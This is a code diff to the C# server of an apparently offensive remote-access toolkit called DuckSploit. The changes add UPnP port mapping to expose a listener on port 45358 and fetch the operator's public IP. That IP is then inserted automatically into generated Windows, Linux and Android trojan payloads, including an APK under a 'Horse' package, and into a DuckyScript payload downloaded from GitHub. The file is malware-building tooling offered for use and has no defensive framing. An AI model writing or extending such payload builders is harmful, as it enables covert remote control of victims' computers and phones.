@@ -15,59 +15,24 @@ using System.Drawing;
 using System.Windows.Forms;
 using DScompiler;
 using DScrypter;
+using Mono.Nat;
 using dsforms;
 
 namespace DSserver
 {
     class Program
     {
+		public static string public_ipv4 = "undefined";
+		
+		
 		public static void Download(string url, string outPath)
 		{
+			ServicePointManager.Expect100Continue = true;
+			ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
+			
+			
 			string tempdir = Path.GetTempPath();
-			
-			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
-			
-			
-			url = '"' + url + '"';
-			
-			outPath = '"' + outPath + '"';
-			
-			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
-			
-			outPath = tempdir + "\\download.ps1";
-			
-            // open or create file
-            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
-            // create stream writer
-            StreamWriter streamwrite = new StreamWriter(streamfile);
-            // add some lines
-			
-			outPath = '"' + tempdir + "\\download.ps1" + '"';
-			
-			
-			// string powershelldownloadtxt = "" + url +"\  "
-            streamwrite.WriteLine(str);
-            // clear streamwrite data
-            streamwrite.Flush();
-            // close stream writer
-            streamwrite.Close();
-            // close stream file
-            streamfile.Close();
-			
-
-			// string error = "";
-			// int exitCode = 0;
-			string output = "";
-			
-			ProcessStartInfo processInfo;
-			Process process;
-			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
-			processInfo.CreateNoWindow = true;
-			processInfo.UseShellExecute = false;
-			processInfo.RedirectStandardOutput = true;
-			process = Process.Start(processInfo);
-			process.WaitForExit();
-			Console.WriteLine(process.StandardOutput.ReadToEnd());
+			new WebClient().DownloadFile(url, outPath);
 			
 		}
 		public static void write_txt_to_file(string path, string str)
@@ -232,8 +197,29 @@ namespace DSserver
 			process = Process.Start(processInfo);
 			process.WaitForExit();
 		}
+		public static void DeviceFound(object sender, DeviceEventArgs args)
+        {
+            INatDevice device = device = args.Device;
+            // device.CreatePortMap(new Mapping(Protocol.Udp, 53, 53));
+            device.CreatePortMap(new Mapping(Protocol.Udp, 45358, 45358));
+			public_ipv4 = device.GetExternalIP().ToString();
+        }
+        public static void DeviceLost(object sender, DeviceEventArgs args)
+        {
+            INatDevice device = args.Device;
+            // device.DeletePortMap(new Mapping(Protocol.Udp, 53, 53));
+            device.DeletePortMap(new Mapping(Protocol.Udp, 45358, 45358));
+            // on device disconnect code
+        }
         static void Main(string[] args)
         {
+			NatUtility.DeviceFound += DeviceFound;
+			NatUtility.StartDiscovery();
+			
+			
+			
+			
+			
 			exec_cmd("start cmd.exe /c taskkill /IM java.exe /f");
 			bool android = false;
 			bool pro = false;
@@ -280,7 +266,7 @@ namespace DSserver
 			}
 			else
 			{
-				s.Server("0.0.0.0", 53);
+				s.Server("0.0.0.0", 45358);
 			}
 			int a = 0;
 			while(a == 0)
@@ -516,7 +502,7 @@ namespace DSserver
 							//windows payload
 							Console.Clear();
 							compiler compiler = new compiler();
-							compiler.compile("win");
+							compiler.compile("win", public_ipv4);
 							b = 1;
 							Console.ReadKey();
 						}
@@ -537,8 +523,6 @@ namespace DSserver
 								Console.WriteLine(" ");
 								exec_cmd("start cmd.exe /c taskkill /IM java.exe /f");
 								
-								sendmsgnonewline("Enter your ip (ipv4, ipv6 or dns server link allowed): ", "green");
-								string myip = Console.ReadLine(); 
 								if (Directory.Exists(tempdir + "\\DSandroid"))
 								{
 									System.IO.DirectoryInfo di = new DirectoryInfo(tempdir + "\\DSandroid");
@@ -570,7 +554,7 @@ namespace DSserver
 								}
 								
 								string text = File.ReadAllText(tempdir + "\\DSandroid\\app\\src\\main\\java\\com\\Duckpvp\\DuckSploit\\Horse\\MainActivity.java");
-								text = text.Replace("<your ip>", myip);
+								text = text.Replace("<your ip>", public_ipv4);
 								File.WriteAllText(tempdir + "\\DSandroid\\app\\src\\main\\java\\com\\Duckpvp\\DuckSploit\\Horse\\MainActivity.java", text);
 								Console.Clear();
 								sendmsg("Loading...", "yellow");
@@ -583,12 +567,10 @@ namespace DSserver
 								
 								sendmsg("DS payload is now generated! ", "yellow");
 								sendmsg("Can be found at: " + dir + "\\generated\\DSandroid_payload.apk", "yellow");
-							
-							
-					
-							
-							
-							
+							}
+							else
+							{
+								sendmsg("[x] Java JDK18 isn't installed, install it first!", "red");
 							}
 							b = 1;
 							Console.ReadKey();
@@ -628,7 +610,7 @@ namespace DSserver
 								{
 									Console.Clear();
 									compiler compiler = new compiler();
-									compiler.compile("win");
+									compiler.compile("win", public_ipv4);
 									Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/payloads/payload.dd", dir + "\\generated\\payload.dd");
 									sendmsg("DuckyScript payload is generated", "yellow");
 									sendmsg("Can be found at: " + dir + "\\generated\\payload.dd", "yellow");
@@ -639,7 +621,7 @@ namespace DSserver
 								{
 									Console.Clear();
 									compiler compiler = new compiler();
-									compiler.compile("lin");
+									compiler.compile("lin", public_ipv4);
 									d = 1;
 									Console.ReadKey();
 								}
